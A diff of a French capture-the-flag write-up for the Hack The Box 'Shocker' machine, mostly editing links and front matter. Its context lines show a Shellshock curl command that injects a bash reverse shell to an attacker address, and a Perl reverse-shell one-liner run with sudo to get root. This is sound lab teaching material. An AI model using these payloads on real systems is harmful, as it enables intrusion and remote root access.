@@ -8,6 +8,7 @@ slug: "shocker"
 date: 2025-11-21T15:40:23+01:00
 #lastmod: 2025-11-21T15:40:23+01:00
 draft: false
+robotsNoIndex: false
 
 # --- PaperMod / navigation ---
 type: "writeups"
@@ -92,7 +93,7 @@ Cette wordlist est conçue pour couvrir les technologies couramment rencontrées
 
 ------
 
-Avant de lancer les scans, vérifie que writeup.htb résout bien vers la cible. Sur HTB, ça passe généralement par une entrée dans /etc/hosts.
+Avant de lancer les scans, vérifie que shocker.htb résout bien vers la cible. Sur HTB, ça passe généralement par une entrée dans /etc/hosts.
 
 - Ajoute l’entrée `10.129.x.x shocker.htb` dans `/etc/hosts`.
 
@@ -510,7 +511,7 @@ Tu formules donc naturellement l’hypothèse d’une exploitation possible et p
 
 ### Shellshock
 
-Tu commences par injecter, dans l’en-tête *User-Agent*, une définition de fonction suivie d’une commande simple (`echo VULN`), conformément au [mécanisme d’exploitation de la vulnérabilité **Shellshock**](https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html).
+Tu commences par injecter, dans l’en-tête *User-Agent*, une définition de fonction suivie d’une commande simple (`echo VULN`), conformément au mécanisme d’exploitation de la vulnérabilité **Shellshock**.
 
 Ce test volontairement minimal permet de valider l’hypothèse formulée précédemment : si le serveur exécute la commande et renvoie la chaîne attendue dans la réponse HTTP, cela confirme que le script CGI interprète l’en-tête comme du code Bash et qu’il est donc **vulnérable à Shellshock**.
 
@@ -534,15 +535,20 @@ uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),4
 
 ```
 
-La vulnérabilité étant désormais confirmée, tu injectes [un **payload Bash de reverse shell**](https://www.revshells.com/) dans l’en-tête *User-Agent*, par exemple généré à l’aide de [revshells.com](https://www.revshells.com/).
+La vulnérabilité étant désormais confirmée, tu injectes un **payload Bash de reverse shell** dans l’en-tête *User-Agent*.
 
-Ce payload est exécuté via **Shellshock** par le script CGI et t'ouvre immédiatement une session distante vers ta machine Kali Linux, te fournissant ainsi un premier shell interactif sur la cible.
+Ce payload est exécuté via **Shellshock** par le script CGI et t’ouvre immédiatement une session distante vers ta machine Kali Linux, te fournissant ainsi un premier shell interactif sur la cible.
 
 ```bash
 curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.xx/4444 0>&1"' http://shocker.htb/cgi-bin/user.sh
 
 ```
-**Pense à lancer ton listener avant d’envoyer le payload.**
+> **Note :**
+> Pour approfondir le fonctionnement interne de la vulnérabilité Shellshock, tu peux consulter cette ressource technique :
+> https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html
+>
+> Pour générer rapidement un payload de reverse shell adapté à ton contexte, l’outil suivant peut être utile :
+> https://www.revshells.com/
 
 ### Reverse Shell dans Kali Linux
 
@@ -624,7 +630,7 @@ Puisque l’utilisateur `shelly` est autorisé à exécuter des commandes **Perl
 Pour cela, tu utilises un **payload Bash encapsulé en Perl**, par exemple généré depuis [revshells.com](https://www.revshells.com/), et l’exécutes via `sudo perl`. Cette technique te permet d’obtenir un shell avec les droits root de manière directe et contrôlée.
 
 ```bash
-shelly@Shocker:/home/shelly$perl -e 'use Socket;$i="10.10.x.x";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
+shelly@Shocker:/home/shelly$ perl -e 'use Socket;$i="10.10.x.x";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
 ```
 
 ### Root Shell dans Kali Linux
